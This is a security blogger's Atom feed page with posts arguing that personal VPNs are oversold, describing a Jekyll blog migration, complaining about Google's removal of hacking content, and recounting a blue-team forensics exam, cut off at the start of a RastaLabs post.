<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Jump ESP, jump! | Because Google started to delete hacking related blog posts without using a single brain cell, I had to learn just another framework. Thx Google</title>
<meta name="generator" content="Jekyll v4.0.1" />
<meta property="og:title" content="Jump ESP, jump!" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Because Google started to delete hacking related blog posts without using a single brain cell, I had to learn just another framework. Thx Google" />
<meta property="og:description" content="Because Google started to delete hacking related blog posts without using a single brain cell, I had to learn just another framework. Thx Google" />
<link rel="canonical" href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/atom.xml" />
<meta property="og:url" content="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/atom.xml" />
<meta property="og:site_name" content="Jump ESP, jump!" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Jump ESP, jump!" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"Because Google started to delete hacking related blog posts without using a single brain cell, I had to learn just another framework. Thx Google","headline":"Jump ESP, jump!","url":"https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/atom.xml"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/feed.xml" title="Jump ESP, jump!" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Jump ESP, jump!<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>Jump ESP, jump!</title>
 <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/atom.xml" rel="self"/>
 <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/"/>
 <updated>2024-12-24T10:57:13+00:00</updated>
 <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com</id>
 <author>
   <name></name>
   <email></email>
 </author>

 
 <entry>
   <title>Personal VPN services are snake-oil</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/2024/03/01/VPN-Snakeoil.html"/>
   <updated>2024-03-01T10:19:41+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/2024/03/01/VPN-Snakeoil</id>
   <content type="html">&lt;h1 id=&quot;intro&quot;&gt;Intro&lt;/h1&gt;
&lt;p&gt;Personal VPN services are a multi-million dollar business. But is it worth your money?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/_img/VPN-1.png&quot; alt=&quot;NordVPN&quot; /&gt;&lt;br /&gt;
If they can &lt;a href=&quot;https://www.thoughtleaders.io/blog/how-much-money-does-pewdiepie-make&quot;&gt;afford to sponsor Pewdiepie&lt;/a&gt;, they should do something right, right? Fifty million flies can’t be wrong!&lt;/p&gt;

&lt;p&gt;This is going to be a complex topic, so bear with me.&lt;/p&gt;

&lt;p&gt;The statement I would like to prove:&lt;br /&gt;
There are only a few problems for a few people worldwide where the answer is using a personal VPN service. 
You don’t need a personal VPN service if you are an average Internet user. 
If you are a tech-savvy user, you can do much better than using a VPN.&lt;br /&gt;
Personal VPNs are the &lt;a href=&quot;https://en.wikipedia.org/wiki/Homeopathy#Evidence_and_efficacy&quot;&gt;homeopathic medicines&lt;/a&gt; of the tech industry. Also known as a scam.&lt;/p&gt;

&lt;h1 id=&quot;glossary&quot;&gt;Glossary&lt;/h1&gt;
&lt;p&gt;By personal/commercial VPN service, I mean NordVPN, Tunnelbear, Mullvad VPN, etc. Company VPNs, or a VPN to phone into your home network, are out of the scope of this article.&lt;br /&gt;
By public Wi-Fi, I mean Wi-Fi services where it is either open or the WPA key is shared with everyone. From a security point of view, there is not much difference between the two.&lt;/p&gt;

&lt;p&gt;Let’s break down the problem of privacy and security. Let’s start with …&lt;/p&gt;

&lt;h1 id=&quot;security&quot;&gt;Security&lt;/h1&gt;
&lt;p&gt;Fifteen years ago, it was common malpractice that even though websites used HTTPS for the login page, the rest of the communication was over HTTP. One could steal the authentication cookie from the unencrypted Wi-Fi stream and use that to log in to that service. Tools like Surfjack and &lt;a href=&quot;https://www.youtube.com/watch?v=etyCbkOKHsc&quot;&gt;Firesheep&lt;/a&gt; were popular tools for wannabe hackers. Back then, using a personal VPN service at public Wi-Fi made sense. Also, many email clients checked their email using unencrypted POP3 or IMAP protocols.&lt;/p&gt;

&lt;p&gt;But nowadays, there &lt;a href=&quot;https://transparencyreport.google.com/https/overview&quot;&gt;is practically no vital service on the Internet&lt;/a&gt;, which does not run on HTTPS.&lt;/p&gt;

&lt;p&gt;OK, but what about tools like &lt;a href=&quot;https://github.com/moxie0/sslstrip&quot;&gt;SSLStrip?&lt;/a&gt;
SSLStrip works like this:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;User types www.mybanklogin.com&lt;/li&gt;
  &lt;li&gt;The browser connects to clear-text, unprotected http://www.mybanklogin.com&lt;/li&gt;
  &lt;li&gt;Attacker having active man-in-the-middle (&lt;a href=&quot;https://en.wikipedia.org/wiki/Man-in-the-middle_attack&quot;&gt;MiTM&lt;/a&gt;) capability sees this traffic&lt;/li&gt;
  &lt;li&gt;The web server notifies the user’s browser that it should use the secure https://www.mybanklogin.com site&lt;/li&gt;
  &lt;li&gt;The attacker removes this notification&lt;/li&gt;
  &lt;li&gt;The user continues the login process over the insecure, unencrypted http://www.mybanklogin.com&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So, can hackers steal my username and password? First, for accounts that matter, you should use 2FA (short for multi-factor authentication). It would be best to use unphisable 2FA like FIDO2/webauthn (e.g. Yubikey) for accounts that matter. 
Nowadays, most browsers implement &lt;a href=&quot;https://therecord.media/eff-to-deprecate-https-everywhere-extension-as-https-is-becoming-ubiquitous&quot;&gt;“HTTPS only mode”&lt;/a&gt;. Next time, instead of turning on your VPN, you should check if your browser already uses HTTPS only mode, and if not, turn that on. For example, Safari does that by default.&lt;br /&gt;
Ask your service provider to implement &lt;a href=&quot;https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security&quot;&gt;HSTS&lt;/a&gt;.
It is excellent about HSTS that the user cannot bypass certificate errors. And the browser will auto-connect to HTTPS by default. 
The good news is that if you use mobile apps, almost all are secure already. Just keep your mobile OS and apps up-to-date. No one will spoil a precious &lt;a href=&quot;https://en.wikipedia.org/wiki/Zero-day_(computing)&quot;&gt;0-day&lt;/a&gt; to attack you. 
If you are worried about DNS MiTM, use &lt;a href=&quot;https://support.mozilla.org/en-US/kb/dns-over-https&quot;&gt;DNS over HTTP&lt;/a&gt; in your browser. 
OK, but what about tools like &lt;a href=&quot;https://www.rapid7.com/blog/post/2015/07/15/the-new-metasploit-browser-autopwn-strikes-faster-and-smarter-part-1/&quot;&gt;Metasploit browser autopwn&lt;/a&gt;? 
Well, the good news is that it is much easier to keep your browser up-to-date compared to ~ ten years ago. Nowadays, however, it is rare that recent browser exploits are openly available for any hacker to use. If you are a target of a government, spy agency, or hacker-for-hire services, yes, they may have the resources to hack your browser, but chances are you are not that important. Sorry. And if you are that important, VPNs will not decrease your risks.&lt;/p&gt;

&lt;p&gt;One massive problem with personal VPN services is that they are working to fail open. If the connection fails, your connection is not “protected” anymore. Some premium VPN providers sell “kill switch” functionality, but I am sure less than 1% of the users use this properly.&lt;/p&gt;

&lt;p&gt;Looking at the practical side, how many legit stories do you know where someone lost money that could have been avoided just by using a VPN? I have never heard such a story. The “ Darkhotel “ attacker group could have been such an example, except that a VPN would not protect you against their attack, as they used fake Wi-Fi captive portals to deliver the exploit/malware. And before logging into a hotel Wi-Fi portal, you can’t start your VPN …&lt;/p&gt;

&lt;p&gt;And before I forget, let’s quickly discuss free VPNs. Never, ever install a free VPN solution. They will abuse your network connectivity, and other malicious or non-malicious users will use it to do whatever they want. It is like inviting one thousand unknown people to your house to have a party and leave them unattended. You can find many stories where free VPNs are actually malware.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/_img/vpn-2.webp&quot; alt=&quot;VPN_ads&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;privacy-concerns&quot;&gt;Privacy concerns&lt;/h1&gt;
&lt;p&gt;OK, but what about my DNS and TLS records being exposed to everyone so they can follow what I am doing? In a public place, anyone can look at your display already. Or, if you are worried about your ISP selling your traffic data, there are better options for you. 
Use &lt;a href=&quot;https://developers.cloudflare.com/1.1.1.1/encryption/dns-over-https/encrypted-dns-browsers/&quot;&gt;DNS over HTTPS&lt;/a&gt;, for example. 
You have to use a VPN provider you trust better than your ISP/Wi-Fi provider.
Also, as &lt;a href=&quot;https://support.mozilla.org/en-US/kb/understand-encrypted-client-hello&quot;&gt;Encrypted Client Hello&lt;/a&gt; is about to start soon, it will be exponentially harder for eavesdroppers to figure out which sites you are trying to visit.&lt;/p&gt;

&lt;p&gt;But if you care about privacy, the answer is always ToR, ToR browser or Tails, and never VPN. Except in cases where you first have to hide your ToR usage using a VPN, which is a rare exception among users. If you don’t understand why you would need that, you probably don’t need that complexity. 
Tor Browser uses uncountable techniques that prevent tracking your browser. And if your privacy is essential against local Wi-Fi attackers, your ISP, why is the ad industry not in scope? Adblockers are only half the solution against tracking.&lt;/p&gt;

&lt;h1 id=&quot;when-to-use-a-personal-vpn&quot;&gt;When to use a personal VPN?&lt;/h1&gt;
&lt;ol&gt;
  &lt;li&gt;Geofence bypass for region-locked content.&lt;/li&gt;
  &lt;li&gt;Piracy. Not that you should not support your artists/musicians/content creators, filmmakers, actors, … but I agree that there are situations in life when piracy is the only ethical option.&lt;/li&gt;
  &lt;li&gt;Soft network block/censorship. Do your own research. Don’t end up in jail.&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Claims made by VPN companies:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;VPNs reduce the risk of “getting hacked,” whatever that means. 
This is not true. Additional services provided by VPNs, like URL filtering, can reduce your risk. However, it is more effective to use URL filtering on the endpoint level, not the network level, as most VPN companies do.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;VPNs protect your privacy&lt;br /&gt;
Even though they increase your privacy, it is still far from what ToR can do for you.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Suppose you want to increase your privacy and security. Instead of watching VPN reviews on YouTube, I recommend that you patch your operating system and your browser and configure always HTTPS and DoH in your browser. Use an ad blocker or, even better, a &lt;a href=&quot;https://www.privacytools.io/private-browser&quot;&gt;browser built with privacy in mind&lt;/a&gt;. If you frequently install new applications, use antivirus/endpoint protection on your non-mobile OS. For Windows, the built-in default Microsoft Defender is a good option. Congratulations, you are in a better position compared to using a VPN, and you don’t have to pay for it, and you don’t have to enable it all the time.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/_img/vpn-3.jpg&quot; alt=&quot;Change-my-mind&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;what-to-read&quot;&gt;What to read?&lt;/h1&gt;
&lt;p&gt;I found these articles also useful. As this is a complex topic, with different aspects, if you want to read more, this is where I recommend to start:&lt;br /&gt;
&lt;a href=&quot;https://overengineer.dev/blog/2019/04/08/very-precarious-narrative.html&quot;&gt;overengineer.dev&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://krebsonsecurity.com/2017/03/post-fcc-privacy-rules-should-you-vpn/&quot;&gt;krebsonsecurity.com&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://gist.github.com/joepie91/5a9909939e6ce7d09e29&quot;&gt;gist.github.com/joepie91&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://www.spacebar.news/you-dont-need-a-vpn/&quot;&gt;www.spacebar.news&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://www.forbes.com/advisor/business/vpn-statistics/&quot;&gt;www.forbes.com&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://it.slashdot.org/story/22/01/02/2143256/nbc-you-probably-dont-need-to-rely-on-a-vpn-anymore&quot;&gt;it.slashdot.org&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;ps&quot;&gt;PS&lt;/h1&gt;
&lt;p&gt;Yes, some of these VPN products provide extra services/functions/protections. And some of these extras make sense. But that does not mean that VPN is the answer to your problems overall.&lt;/p&gt;

&lt;h1 id=&quot;ps-2&quot;&gt;PS 2&lt;/h1&gt;
&lt;p&gt;WPA3 can support encryption and privacy on open, non-password-protected networks. I have not seen it anywhere in the wild, but the future is bright. If you operate open Wi-Fi networks, please, please, upgrade to WPA3.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>"Just" migrate to Jekyll ...</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/2023/04/05/Just_use_Jekyll.html"/>
   <updated>2023-04-05T10:49:41+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/2023/04/05/Just_use_Jekyll</id>
   <content type="html">&lt;h1 id=&quot;intro&quot;&gt;Intro&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;/2022/09/16/Google.html&quot;&gt;As I already ranted about it&lt;/a&gt;, I am not very satisfied with multiple Google services recently (blogger, YouTube), so I started looking for alternative solutions for my blog. Based on a quick Twitter poll, all the cool kids use Jekyll and Github pages nowadays, and I did not want to miss out …&lt;br /&gt;
Had I known how much time I had to spend on this blog migration, I probably would not start it in the first place …&lt;/p&gt;
&lt;h1 id=&quot;jekyll&quot;&gt;Jekyll&lt;/h1&gt;
&lt;p&gt;Why Jekyll and Github pages?&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Because it is free&lt;/li&gt;
  &lt;li&gt;I don’t have to operate my own webserver&lt;/li&gt;
  &lt;li&gt;I don’t have to maintain proper TLS config&lt;/li&gt;
  &lt;li&gt;It is a static website&lt;/li&gt;
  &lt;li&gt;Github is more secure than most services&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;My first task was installing Jekyll locally to test my web pages locally. This was my first mistake. I created this Jekyll environment on the macOS like an animal - without using Docker. &lt;br /&gt;
&lt;img src=&quot;/_img/jekyll.jpg&quot; alt=&quot;Jekyll&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;/_img/maneuver.jpg&quot; alt=&quot;maneuver&quot; /&gt;&lt;br /&gt;
 Or ~1 hour at least. Pro tip: use &lt;a href=&quot;https://hub.docker.com/r/jekyll/jekyll/&quot;&gt;Docker&lt;/a&gt;. Cool, now we have it. I spent significant time trying to figure out the proper _config.yml config and Gemfile parameters, but I think I figured out what I needed, kinda. Not perfect, but it works.&lt;/p&gt;

&lt;p&gt;The next challenge was saving the blog posts from Blogger/Blogspot in a Jekyll-readable format. I tried multiple solutions, but only &lt;a href=&quot;https://gist.github.com/rupeshtiwari/80f2203fee697a94e4b11b75b856aa56&quot;&gt;this&lt;/a&gt; was close enough to do anything. After that, I realized the formatting was effed up on numerous posts. It took me a while to figure out the problem was image styles and another &amp;lt;br&amp;gt;\ related issue I cannot reproduce anymore. It did not help that I tried to debug this problem on a machine where I did not have the Jekyll installation, and I waited 5 minutes for Github to rebuild the site to test that I still did not figure out what the issue was. Clearly, I did set up the local dev env to avoid this exact situation …&lt;/p&gt;

&lt;p&gt;The next step was to download all the images from the blog posts, store them in the website repo, and rewrite all the URLs on the pages. You would think this is a trivial exercise, but I ended up with ~100 lines of Python code, running and rerunning it at least seven times to get there.&lt;/p&gt;

&lt;p&gt;Next, I realized that the “content creation” date was somehow messed up with the last update, but the code looks OK. So I fixed this on all the blog posts manually. While doing this, I realized that the blog post exporter script only saved 25 posts, probably a limitation on the blogger feed system itself. So I had to download the rest of the blog posts, download the images again, download the incorrect HTML tags again, fix the image URLs, and fix the creation dates.&lt;/p&gt;

&lt;p&gt;Meanwhile, I always had this issue: whenever I pushed the latest version, my custom domain name did not work anymore - I had to configure this in the CNAME file. And after I had already built and rebuilt, and rebuilt the site with Github pages, it turned out there was a &lt;a href=&quot;https://github.com/Z6543/Z6543.github.io/blob/8bff56adf2ba60ab65cc77597e073e790b050fec/.github/workflows/jekyll.yml#L15&quot;&gt;caching possibility&lt;/a&gt;, which in fact, can change the build time from five minutes to one minute. Probably, there is an even better solution, but this is good enough for now.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Am I satisfied with the overall result? Yes. &lt;br /&gt;
Am I satisfied with how I got here? No.&lt;br /&gt;
Do I recommend this route? If you have free time, yes.&lt;br /&gt;
Should this be so complicated? I hope not. &lt;br /&gt;
Do I like that my website uses Ruby? Hell no.&lt;/p&gt;

</content>
 </entry>
 
 <entry>
   <title>So Long Google, and Thanks for All the Fish</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/2022/09/16/Google.html"/>
   <updated>2022-09-16T13:39:00+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/2022/09/16/Google</id>
   <content type="html">&lt;h1 id=&quot;thx-google-and-youtube-i-got-what-i-paid-for-&quot;&gt;Thx, Google and YouTube. I got what I paid for …&lt;/h1&gt;

&lt;p&gt;I joined Gmail at the end of 2005. It was not invite-only anymore but still restricted in some countries. It was a novel service compared to my previous one, freemail.hu … if you live in Hungary, you know … 
Anyway, I am still using Gmail as my primary email after 17 years, and I still have not run out of storage. Even though I am paying money for an encrypted email service, searching in that one is pretty bulky, so I only use that one for online shopping, healthcare, and other sensitive topics where I don’t want Google to know everything. 
I uploaded my first hacking-related &lt;a href=&quot;https://www.youtube.com/watch?v=lsMK84QOb2M&quot;&gt;YouTube video&lt;/a&gt; in 2012. 
I wrote &lt;a href=&quot;https://jumpespjump.blogspot.com/2013/11/secure-ipv6-deployment-checklist-think.html&quot;&gt;my first blog post&lt;/a&gt; on Blogger/Blogspot in 2013, when my friend invited me to write some new hacking-related content on his blog. 
As you can see, I was a happy Google user … until I was not.&lt;/p&gt;

&lt;p&gt;On February 27, 2021, I got an email from “YouTube team” that my video with the title “IoT hack - IP camera via cloud password brute-force” was removed because it violated the &lt;a href=&quot;https://support.google.com/youtube/answer/2801964?hl=en&quot;&gt;“Harmful or dangerous content policies”&lt;/a&gt;. 
I understand that via keyword-search or quickly looking at the video it got flagged. I disagree with removing the video, as it was about warning of the dangers and did not provide any step-by-step guide or link to hacking codes. But I understand that mistakes happen. What made things worse is that they deleted the video, and I could not access it via YouTube Studio. This is a terrible practice. Please change it.&lt;/p&gt;

&lt;p&gt;I felt that appealing would not resolve the issue, so I did the opposite. I emailed them that, “in this case, they should delete all of my videos”. Right after clicking on the send button, I got an instant reply. They “carefully” checked my appeal but will not change their mind. Clearly they did not check the mail.
I also reached out for help on Twitter, and a &lt;a href=&quot;https://twitter.com/gynvael/status/1365957884245401602&quot;&gt;nice hacker guy&lt;/a&gt; working for Google helped me , but unfortunately, the issue was not resolved. 
I moved on. I still do not know what will be the best place to host my educational hacking videos.&lt;/p&gt;

&lt;p&gt;On August 21, 2022, I got a mail from the Blogger team. They have unpublished &lt;a href=&quot;https://web.archive.org/web/20210517170248/https://jumpespjump.blogspot.com/2020/09/my-whcd-exam-experience.html&quot;&gt;one of my posts&lt;/a&gt; because it &lt;a href=&quot;https://blogger.com/go/contentpolicy&quot;&gt;violated their guideline&lt;/a&gt;, especially the “Malware and Viruses policy”
Honestly, I don’t know how this blog post could have violated it, as this describes how I passed a blue team-related exam. Yes, the post discussed malware, but not a single piece of code or anything suspicious was published in the blog post. As that would have spoiled the fun … 
The good news is that they did not delete the post, at least.&lt;/p&gt;

&lt;h1 id=&quot;the-conclusion&quot;&gt;The conclusion?&lt;/h1&gt;
&lt;p&gt;I think I can’t complain as I was “only” paying with my personal data for Google, so I got what one could expect … But I believe it is time to migrate from Google totally if you want to publish any educational-related hacking material. For the time being, maybe it is time that I start to flag all of their &lt;a href=&quot;https://googleprojectzero.blogspot.com/&quot;&gt;Project Zero&lt;/a&gt; blog posts, as they clearly violate their guidelines … 
And let’s hope Microsoft will not delete the hacking-related blog posts on GitHub pages.&lt;/p&gt;

</content>
 </entry>
 
 <entry>
   <title>My WHCD experience</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/2020/09/10/WHCD.html"/>
   <updated>2020-09-10T13:53:14+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/2020/09/10/WHCD</id>
   <content type="html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;My story starts in July in Budapest, summer is hot. Way too hot. I am working in the cozy air-conditioned office room and look at my daily schedule. I have a business lunch with Sándor Fehér, co-founder &amp;amp; CEO at White Hat IT Security at an Italian restaurant. This will be a casual meeting, catching up with each other, no preparation needed. I show up at the place, meet Sándor, order a pizza, and we discuss average lunch topics like how APT attackers operate nowadays. He mentions that in September they will organize the exam for their &lt;a href=&quot;https://whitehat.eu/whcd&quot;&gt;WHCD - White Hat Certified Defender&lt;/a&gt; course. And he is happy to provide me a slot for the exam for free. But as nothing is free in life. If I pass - and why would not I? :) - I create a blog post about my view on the exam. I happily accept the invitation and finish the pizza.&lt;/p&gt;

&lt;h1 id=&quot;preparation&quot;&gt;Preparation&lt;/h1&gt;
&lt;p&gt;In 2020, the course consisted of 36 hours of training, touching topics like threat intelligence, IoCs, computer forensics, network forensics, all the blue team-related topics. I felt pretty confident that I don’t have to prepare for this exam, even if I did not attend the training and I did zero real forensics investigation in the past eight years.&lt;br /&gt;
Before the exam, I received multiple documents on the rules and practical information for the exam. The exam started at 20:00 Friday and ended on 20:00 Sunday. 48 hours for finding 10 flags and provide documentation. Actually, 7 flags are enough to pass the test. The only preparations I made was to buy some energy drinks and sweets. Time is 19:30, so I still have some time to watch the latest Last week tonight before the exam starts.&lt;/p&gt;

&lt;h1 id=&quot;my-past-experience&quot;&gt;My past experience&lt;/h1&gt;
&lt;p&gt;I have the following certifications which helped me during the exam: OSCP, OSCE, PSP (Powershell for Penetration Testers). I also have some experience with &lt;a href=&quot;https://cujo.com/first-seclounge-ctf-2020-solutions/&quot;&gt;CTFs&lt;/a&gt;. 8 years ago I did some forensics investigations, but that was a loooong time ago, things changed. A lot.&lt;/p&gt;

&lt;h1 id=&quot;the-exam---friday&quot;&gt;The exam - Friday&lt;/h1&gt;
&lt;p&gt;I receive all the IP addresses and credentials to log in to my dedicated Windows AD network, consisting of a workstation, a File Server, and a Domain Controller. I am happy that I have to work with a live system - it is really painful when you work with offline images. I set the goal that today I find at least one flag, have a good night’s sleep and find the remaining 9 on Saturday, and write the documentation on Sunday. Let’s find the easiest task and get the flag quickly … The challenge descriptions are clear, and even the challenge IDs nicely map to MITRE ATT&amp;amp;CK®.&lt;br /&gt;
Two hours later I realize I underestimated the difficulty of this exam, and I overestimated my skills. Zero flags found and …&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/_img/dog.jpg&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Spoiler alert - I was logging into the workstation with the admin user, and not with the victim. I realized this on Sunday afternoon … This first initial mistake took me at least two hours lost in this initial stage. Anyway, always read through the exam instructions and don’t rush into connecting to the first machine on the provided list. I finally find a sneaky backdoor, analyze it, and submit my first flag. Phew, this is not going to be easy. I go to sleep, but at 5:30 a.m. my brain starts to figure out the challenges even though I am still in my bed, eyes closed. Based on past experience, it does not make sense to try to force myself to sleep, it is better to wake up and &lt;a href=&quot;https://www.youtube.com/watch?v=RYnFIRc0k6E&quot;&gt;keep rollin’&lt;/a&gt;.&lt;/p&gt;

&lt;h1 id=&quot;saturday&quot;&gt;Saturday&lt;/h1&gt;
&lt;p&gt;Around 10:00 a.m., I submit another flag. I already spent like seven hours, and I only have two flags. Boy oh boy, this is going to be tough. Time to crack open another energy drink. Hours later I find myself ALT + TAB-bing between the different challenges and making no progress. Time to have a &lt;a href=&quot;https://www.youtube.com/watch?v=ncNv1RyGgQk&quot;&gt;break&lt;/a&gt;. When I am back, I make some good progress. Basic programming skills are really needed to solve multiple challenges. Sometimes I mix up AES keys with IVs but luckily it is OK to fail. Flag after flag. It is evening, and I have 6 flags already \o/. I also found our main suspect, a bird! I was like “let’s find the seventh flag now and I can rest in peace”. Let’s connect the “Rubber duck debugging” and writing the documentation together - maybe I find out what I missed. It is already dark outside, I am tired as hell, but I made good progress with the documentation at least. This tactic turned out to be useful, as I submitted my seventh flag! Finally. I feel like &lt;a href=&quot;https://en.wikipedia.org/wiki/Dwayne_Johnson&quot;&gt;rock&lt;/a&gt; and I can find all the remaining flags on Sunday. GOTO sleep(28800).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/_img/flag.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;sunday&quot;&gt;Sunday&lt;/h1&gt;
&lt;p&gt;My brain wakes up again earlier than I want. Let’s finish the documentation and after that focus on the remaining flags. I spend a lot of time on Stackoverflow on how to insert nice syntax-highlighted code into the report (Hello Microsoft, it is 2020, please make it easier for us with builtin tools …) and I also spend more time than I want to admit on how to format the flags in Wordart to make it look nice. Documentation finished, let’s go back to work. While I close all the opened tabs, I finally find the exam instructions, with the credentials to the user’s workspace. “What the fluff, how could I overlook this?”. &lt;a href=&quot;https://www.youtube.com/watch?v=HXQUWmXzPeM&quot;&gt;MMMKay&lt;/a&gt;, let’s log in. Run a bunch of tools. Run even more tools. Let’s dig up emails from 2009 for a German forensics tool I don’t remember the name anymore. But this whole exam is less about tools and more about perseverance and thoroughness. Time flies fast, no progress. Let’s have a break, and &lt;a href=&quot;https://www.youtube.com/watch?v=7I68_BdAQmw&quot;&gt;kill Sigrun, the Valkyrie Queen in God of War&lt;/a&gt;. When I got back, no new flags submitted themselves. Let’s listen to a &lt;a href=&quot;https://www.youtube.com/watch?v=fPslvBVqJp8&amp;amp;list=PLz6hefdTd2T5SThoTI0TD-WzwzBVUdj08&quot;&gt;CTF playlist&lt;/a&gt;, maybe that helps. Well, no, it does not. Let’s download &lt;del&gt;malware&lt;/del&gt; &lt;a href=&quot;https://github.com/gentilkiwi/mimikatz/releases&quot;&gt;information collector software&lt;/a&gt; to the workstation and run that for clues. Pro tip: never do this on a live forensics investigation ;)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/_img/bear.jpg&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It’s at 6 o’clock in the evening and I am getting really tired. And the fact that I already have enough flags to pass the exam makes me lazy. I close my eyes and all I can see is obfuscated code flickering. I literally made zero progress on Sunday on the remaining flags. Maybe if the passing limit was 8 flags, I would have tried harder®? We will never know.&lt;/p&gt;

&lt;h1 id=&quot;monday&quot;&gt;Monday&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/_img/cat.gif&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;The whole exam experience was perfect. Access to the machines was fast and responsive. I did not experience any technical glitch. All the challenges and the whole story is very challenging but possible to solve. I would say that high-end financially motivated attackers could attack any corporation the same way, and basic detection or forensics would miss most clues. The whole scenario is 100% realistic. Most attacks/techniques are sneaky. The only thing I missed is that on the official exam Discord, they should create a #rage or #random or #memes channel where you can send all your frustration during the exam.&lt;/p&gt;

&lt;p&gt;Lesson l: Never underestimate an exam just because it is not known. 
Lesson 2: Never overestimate the knowledge and skills you did not practice for a long time. 
Lesson 3: This WHCD exam provided me the same - or even better experience than I had at Offensive exams like OSCP or OSCE. 
If someone passes this challenge, it is really true that the person really knows how to technically deal with computer incidents. I vision great success for this certification because as of today, there are not many hands-on practical defender exams available on the market. 
I would like to thank Sándor Fehér for this opportunity and to János Pallagi for his support during the weekend and to share some thoughts with me after the exam.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/_img/whcd.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>The RastaLabs experience</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/ad/security/hackthebox/mimikatz/pentest/rastalabs/redteam/2020/01/16/The-RastaLabs-experience.html"/>
   <updated>2020-01-16T15:23:43+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/ad/security/hackthebox/mimikatz/pentest/rastalabs/redteam/2020/01/16/The-RastaLabs-experience</id>
